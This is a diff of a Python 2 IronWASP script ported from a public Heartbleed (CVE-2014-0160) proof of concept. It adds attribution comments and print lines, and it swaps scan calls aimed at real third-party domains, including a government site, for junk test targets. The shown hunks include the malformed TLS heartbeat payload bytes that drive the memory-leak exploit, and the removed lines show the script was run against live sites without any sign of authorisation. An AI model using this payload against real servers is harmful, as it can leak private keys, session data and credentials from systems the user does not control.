@@ -1,5 +1,9 @@
 #!/usr/bin/env python2
 
+# This is IronWASP script to scan for HeartBleed Vulnerability. 
+#You need to have latest version of IronWASP to run this script. Download it from www.ironwasp.org
+#reference https://gist.github.com/takeshixx/10107280 
+
 import sys
 import socket
 import time
@@ -161,9 +165,10 @@ hexmessage = " 16 03 02 00 dc 01 00 00 d8 03 02 53 43 5b 90 9d 9b 72 0b bc 0c bc
 hello = Tools.HexToBytes(hexmessage.replace(" ", "%"))
 hb = Tools.HexToBytes(" 18 03 02 00 03 01 FF FF".replace(" ", "%"))
 
+print "\n This script is based almost entirely on the quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)"
+print "\n This is just a porting of https://gist.github.com/takeshixx/10107280 to IronWasp" 
+print "\n The author disclaims copyright to this source code."
+
+#TEST DATA
 scan("ADSasdfasfd_JUNK")
 scan("blah-blah.com")
-scan("fpsc.gov.pk")
-scan("irctc.co.in")
-scan("driverscollection.com")
-scan("digitalmarketer.com")
